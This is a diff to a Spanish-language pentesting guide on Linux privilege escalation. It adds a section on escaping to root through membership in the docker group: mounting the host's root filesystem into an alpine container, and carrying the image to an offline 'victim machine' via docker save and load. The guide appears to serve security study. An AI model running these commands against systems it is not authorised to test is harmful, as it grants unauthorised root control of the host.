@@ -2778,7 +2778,7 @@ Los trabajos Cron son tareas programadas en sistemas Unix/Linux que se ejecutan 
 
 ![Tareas Cron](/img/cron.png)
 
-Podemos verificar si una tarea cron está activa usando [Pspy](https://github.com/DominicBreuker/pspy), una utilidad de línea de comandos que nos permite observar los procesos en ejecución sin necesidad de acceso root. Esta herramienta nos permite monitorear los comandos ejecutados por otros usuarios, incluyendo tareas cron. Funciona escaneando el sistema de archivos `procfs`. Para usar pspy, podemos ejecutar el siguiente comando.
+Podemos verificar si una tarea cron está activa usando [Pspy](https://github.com/DominicBreuker/pspy), una utilidad de línea de comandos que nos permite observar los procesos en ejecución sin necesidad de acceso root. Esta herramienta nos permite monitorear los comandos ejecutados por otros usuarios, incluyendo tareas cron. Funciona escaneando el sistema de archivos `procfs`. Para usar pspy, podemos ejecutar el siguiente comando:
 
 ```bash
 ./pspy64
@@ -2910,6 +2910,24 @@ A continuación, se describe el proceso para explotar un contenedor LXD/LXC con 
     - También podemos asignar permisos SUID al binario bash de `/mnt/bin/bash`.
 
 ##### Docker
+
+Si somos miembros del grupo `docker`, podemos escalar nuestros privilegios a `root`.
+
+La idea es montar el directorio `/` de la máquina host en nuestro contenedor. Una vez montado el directorio, tendremos acceso a `root` en nuestro contenedor y podremos manipular cualquier archivo del sistema de archivos del host a través del contenedor.
+
+```bash
+docker run -v /:/mnt -it alpine
+```
+Montamos el directorio `/` (raíz) del host en el directorio `/mnt` del contenedor y con la opción `-it` le indicamos que queremos ejecutar una termina interactiva y que la imágen base será `alpine`.
+
+En caso de que la máquina víctima no tenga acceso a internet, podemos hacer lo siguiente:
+
+- `docker pull alpine`: Descargamos la imagen de Alpine en nuestra máquina atacante.
+- `docker save -o alpine.tar alpine`: Guardamos la imagen de Alpine en un archivo tar y la transferimos a la máquina víctima.
+- `docker load -i alpine.tar`: Cargamos la imagen desde el archivo tar.
+- `docker image ls`: Comprobamos que se cargo correctamente la imagen.
+- `docker run -v /:/mnt -it alpine`: Creamos el contenedor.
+
 ##### Python Library Hijacking
 ##### LD_PRELOAD Shared Library
 ##### Shared Object
